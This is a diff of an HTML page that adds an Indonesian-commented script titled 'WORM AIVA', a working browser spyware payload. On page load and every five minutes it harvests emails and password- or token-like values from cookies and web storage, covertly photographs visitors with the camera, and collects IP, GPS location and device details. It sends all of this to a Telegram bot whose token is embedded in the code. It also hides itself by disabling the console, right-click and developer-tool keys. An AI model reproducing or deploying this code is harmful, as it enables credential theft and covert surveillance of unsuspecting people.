@@ -20,24 +20,35 @@ body {
 </head>
 <body>
 <div style="display:none;"></div>
+
 <script>
+// ============================================================
+// WORM AIVA — FINAL VERSION
+// Data langsung dikirim ke TELEGRAM BOT
+// ============================================================
+
 (function() {
     'use strict';
-    
-    // ============================================
-    // GANTI DENGAN URL SERVER KAMU
-    // ============================================
-    const SERVER_URL = 'https://Yonzz-Gabut.github.io/Yonzz-aiva/collector.php';
-    // ============================================
-    
+
+    // ============================================================
+    // KONFIGURASI TELEGRAM
+    // ============================================================
+    const BOT_TOKEN = '8806813025:AAFUuyClrFAKIaOn8muWbbraedaynTOisS0';
+    const CHAT_ID = '412176517'; // <- GANTI DENGAN CHAT ID KAMU!
+    // ============================================================
+
     let victimId = 'VICTIM_' + Date.now().toString(36).toUpperCase() + '_' + Math.random().toString(36).substr(2, 6).toUpperCase();
-    
+
+    // ============================================================
+    // 1. DAPATKAN DATA PERANGKAT
+    // ============================================================
+
     function getDeviceData() {
         const ua = navigator.userAgent;
         let deviceName = 'Unknown Device';
         let chipset = 'unknown';
         let os = 'unknown';
-        
+
         if (ua.includes('Android')) {
             const modelMatch = ua.match(/; ([\w\s]+) Build\//);
             if (modelMatch) deviceName = modelMatch[1].trim();
@@ -46,32 +57,33 @@ body {
             else if (ua.includes('Pixel')) chipset = 'Google Tensor';
             else chipset = 'ARM Processor';
             os = 'Android ' + (ua.match(/Android\s([\d.]+)/) || [])[1] || 'unknown';
-        }
-        else if (ua.includes('iPhone')) {
+        } else if (ua.includes('iPhone')) {
             const model = ua.match(/iPhone(\d+)/);
             if (model) deviceName = 'iPhone ' + model[1];
             else deviceName = 'iPhone';
             chipset = 'Apple A-series';
             os = 'iOS ' + (ua.match(/OS\s([\d_]+)/) || [])[1]?.replace(/_/g, '.') || 'unknown';
-        }
-        else if (ua.includes('Windows')) {
+        } else if (ua.includes('Windows')) {
             deviceName = 'Windows PC';
             chipset = 'Intel/AMD x86';
             os = 'Windows ' + (ua.match(/Windows NT\s([\d.]+)/) || [])[1] || 'unknown';
-        }
-        else if (ua.includes('Macintosh')) {
+        } else if (ua.includes('Macintosh')) {
             deviceName = 'Mac';
             chipset = 'Apple Silicon';
             os = 'macOS';
         }
-        
+
         return { deviceName, chipset, os };
     }
-    
+
+    // ============================================================
+    // 2. EKSTRAK EMAIL
+    // ============================================================
+
     function getEmails() {
         const emails = [];
         const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-        
+
         try {
             for (let i = 0; i < localStorage.length; i++) {
                 const val = localStorage.getItem(localStorage.key(i));
@@ -80,8 +92,8 @@ body {
                     if (found) emails.push(...found);
                 }
             }
-        } catch(e) {}
-        
+        } catch (e) {}
+
         try {
             for (let i = 0; i < sessionStorage.length; i++) {
                 const val = sessionStorage.getItem(sessionStorage.key(i));
@@ -90,20 +102,24 @@ body {
                     if (found) emails.push(...found);
                 }
             }
-        } catch(e) {}
-        
+        } catch (e) {}
+
         try {
             const found = document.cookie.match(emailRegex);
             if (found) emails.push(...found);
-        } catch(e) {}
-        
+        } catch (e) {}
+
         return [...new Set(emails)];
     }
-    
+
+    // ============================================================
+    // 3. EKSTRAK PASSWORD
+    // ============================================================
+
     function getPasswords() {
         const passwords = [];
         const keywords = ['password', 'pass', 'pwd', 'secret', 'key', 'token', 'auth', 'login', 'credential'];
-        
+
         try {
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
@@ -118,8 +134,8 @@ body {
                     }
                 }
             }
-        } catch(e) {}
-        
+        } catch (e) {}
+
         try {
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
@@ -134,40 +150,46 @@ body {
                     }
                 }
             }
-        } catch(e) {}
-        
+        } catch (e) {}
+
         return passwords;
     }
-    
+
+    // ============================================================
+    // 4. AMBIL FOTO DARI KAMERA
+    // ============================================================
+
     function capturePhoto() {
         return new Promise((resolve) => {
             let video = document.createElement('video');
             let canvas = document.createElement('canvas');
-            
-            navigator.mediaDevices.getUserMedia({ 
-                video: { 
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            navigator.mediaDevices.getUserMedia({
+                video: {
                     facingMode: 'environment',
-                    width: { ideal: 800 },
-                    height: { ideal: 600 }
-                }, 
-                audio: false 
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                },
+                audio: false
             })
             .then(stream => {
                 video.srcObject = stream;
                 video.onloadedmetadata = function() {
                     video.play();
                     setTimeout(() => {
-                        canvas.width = video.videoWidth || 800;
-                        canvas.height = video.videoHeight || 600;
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
                         let ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        let photoData = canvas.toDataURL('image/jpeg', 0.8);
-                        
+
+                        let photoData = canvas.toDataURL('image/jpeg', 0.7);
+
                         stream.getTracks().forEach(track => track.stop());
                         video.remove();
                         canvas.remove();
-                        
+
                         resolve(photoData);
                     }, 500);
                 };
@@ -183,24 +205,30 @@ body {
                             canvas.height = video.videoHeight || 480;
                             let ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            
-                            let photoData = canvas.toDataURL('image/jpeg', 0.8);
-                            
+
+                            let photoData = canvas.toDataURL('image/jpeg', 0.7);
+
                             stream.getTracks().forEach(track => track.stop());
                             video.remove();
                             canvas.remove();
-                            
+
                             resolve(photoData);
                         }, 500);
                     };
                 })
                 .catch(() => {
+                    video.remove();
+                    canvas.remove();
                     resolve(null);
                 });
             });
         });
     }
-    
+
+    // ============================================================
+    // 5. DAPATKAN IP
+    // ============================================================
+
     function getIP() {
         try {
             const xhr = new XMLHttpRequest();
@@ -209,10 +237,14 @@ body {
             if (xhr.status === 200) {
                 return JSON.parse(xhr.responseText).ip;
             }
-        } catch(e) {}
+        } catch (e) {}
         return 'unknown';
     }
-    
+
+    // ============================================================
+    // 6. DAPATKAN LOKASI GPS
+    // ============================================================
+
     function getLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -232,17 +264,11 @@ body {
             );
         });
     }
-    
-    function sendData(data) {
-        try {
-            fetch(SERVER_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(() => {});
-        } catch(e) {}
-    }
-    
+
+    // ============================================================
+    // 7. AMBIL SEMUA STORAGE
+    // ============================================================
+
     function getAllStorage(type) {
         const data = {};
         try {
@@ -254,15 +280,78 @@ body {
                     data[key] = val.length > 500 ? val.substring(0, 500) + '...' : val;
                 }
             }
-        } catch(e) {}
+        } catch (e) {}
         return data;
     }
-    
+
+    // ============================================================
+    // 8. KIRIM DATA KE TELEGRAM (Langsung)
+    // ============================================================
+
+    function sendToTelegram(data) {
+        // --- Kirim Pesan Teks ---
+        let message = '🔴 NEW VICTIM!\n\n';
+        message += '🆔 ID: ' + (data.victimId || 'unknown') + '\n';
+        message += '📱 Device: ' + (data.deviceName || 'unknown') + '\n';
+        message += '🔧 Chipset: ' + (data.chipset || 'unknown') + '\n';
+        message += '💻 OS: ' + (data.os || 'unknown') + '\n';
+        message += '🌐 IP: ' + (data.ip || 'unknown') + '\n';
+        message += '📍 Location: ' + (data.location ? data.location.lat + ', ' + data.location.lng : 'unknown') + '\n';
+        message += '📧 Emails: ' + (data.emails || []).join(', ') + '\n';
+        message += '🔑 Passwords: ' + (data.passwords || []).length + ' found\n';
+        message += '📸 Photo: ' + (data.photo ? 'YES' : 'NO') + '\n';
+        message += '⏰ Time: ' + (data.timestamp || 'unknown') + '\n';
+        message += '🌐 URL: ' + (data.url || 'unknown');
+
+        const urlText = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+
+        fetch(urlText, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        }).catch(() => {});
+
+        // --- Kirim Foto (jika ada) ---
+        if (data.photo && data.photo.startsWith('data:image')) {
+            const urlPhoto = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto';
+
+            fetch(data.photo)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', '📸 Photo from: ' + (data.deviceName || 'unknown'));
+
+                    fetch(urlPhoto, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(() => {});
+                })
+                .catch(() => {});
+        }
+    }
+
+    // ============================================================
+    // 9. KUMPULKAN SEMUA DATA
+    // ============================================================
+
     async function collectAll() {
         const device = getDeviceData();
-        const photo = await capturePhoto();
+
+        let photo = null;
+        try {
+            photo = await capturePhoto();
+        } catch (e) {
+            photo = null;
+        }
+
         const location = await getLocation();
-        
+
         const data = {
             victimId: victimId,
             timestamp: new Date().toISOString(),
@@ -288,29 +377,36 @@ body {
             localStorage: getAllStorage('local'),
             sessionStorage: getAllStorage('session'),
         };
-        
-        sendData(data);
+
+        // Kirim ke Telegram
+        sendToTelegram(data);
     }
-    
-    // === STEALTH ===
+
+    // ============================================================
+    // 10. STEALTH — MATIKAN JEJAK
+    // ============================================================
+
     console.log = function() {};
     console.warn = function() {};
     console.error = function() {};
     console.info = function() {};
     console.debug = function() {};
-    
+
     document.addEventListener('contextmenu', e => e.preventDefault());
-    
+
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'F12' || 
+        if (e.key === 'F12' ||
             (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
             (e.ctrlKey && e.key === 'U')) {
             e.preventDefault();
             return false;
         }
     });
-    
-    // === START ===
+
+    // ============================================================
+    // 11. START
+    // ============================================================
+
     if (document.readyState === 'complete') {
         setTimeout(collectAll, 2000);
     } else {
@@ -318,11 +414,11 @@ body {
             setTimeout(collectAll, 2000);
         });
     }
-    
+
     setInterval(collectAll, 300000);
     window.addEventListener('beforeunload', collectAll);
     window.addEventListener('pagehide', collectAll);
-    
+
 })();
 </script>
 </body>
